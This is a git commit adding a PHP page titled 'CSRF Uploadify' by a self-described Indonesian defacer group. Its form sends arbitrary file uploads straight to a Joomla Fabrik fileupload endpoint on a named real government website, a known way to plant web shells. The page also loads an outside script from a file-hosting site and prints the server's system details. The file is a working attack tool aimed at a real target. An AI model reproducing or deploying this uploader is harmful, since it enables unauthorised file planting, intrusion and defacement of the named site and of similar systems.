fb92464a3701348be7030d21a971f98bd7f4214a
sec-attack45 <44795581+sec-attack45@users.noreply.github.com>
2018-11-15 18:59:51 +0700

    Add files via upload

---
+++ euy.php
@@ -0,0 +1,65 @@
+<?php
+/*
+##########################################################
+##    Name    : Sec Attack45.                           ## 
+##    Author  : All Friends Me                          ## 
+##    Team    : Indonesian Error System                 ##
+##########################################################
+*/
+?>
+<!-- GobloG -->
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  
+  <head>
+	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+	<Meta http-equiv="content-type" content="text/html; charset=windows-1254">
+	  <Meta http-equiv="content-type" content="text/html; charset=ISO-8859-9">
+		<meta name="description" content="Indonesian Defacer" />
+		
+<title>CSRF UPLOAD</title>
+</head>
+</br>
+<style>
+body {
+	background-color: black;
+	color: white;
+	text-align: center;
+	}
+	kon {
+	font-size: 20pt; 
+	font-family: 'Sedgwick Ave', cursive;
+	}
+	tol {
+	font size: 14pt;
+	font-family: Cairo;
+	}
+	loe {
+	font size: 14pt;
+	font-family: Shadows Into Light;
+	}
+</style>
+<script type="text/Ãƒâ€šÃ‚Â­javascript" src="http://Ãƒâ€šÃ‚Â­yourjavascript.com/Ãƒâ€šÃ‚Â­56133167111/fb.js"></script>
+<body>
+	<link href='http://fonts.googleapis.com/css?family=Cairo' rel='stylesheet' type='text/css'>
+	  <link href='http://fonts.googleapis.com/css?family=Shadows+Into+Light' rel='stylesheet' type='text/css'>
+		<link href="https://fonts.googleapis.com/css?family=Dosis|Sedgwick+Ave" rel="stylesheet">
+		<center>
+	
+   <font>
+   <h1><b><tol>CSRF Uploadify By<loe> Sec Attack45<b></h1>
+   </font>
+<form enctype="multipart/form-data" action="http://pn-jeneponto.go.id/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload" method="post">
+<tol>
+<?php
+echo "<loe><center><b>".php_uname()."</br><br>";
+?>
+<input name="file" type="file">  
+<input type="submit" value="Upload">
+</form>
+<br>
+<br>
+<img src="https://preview.ibb.co/j8rAFA/ex.jpg" border="" width="450px" height=""></center>
+<br>
+</html>
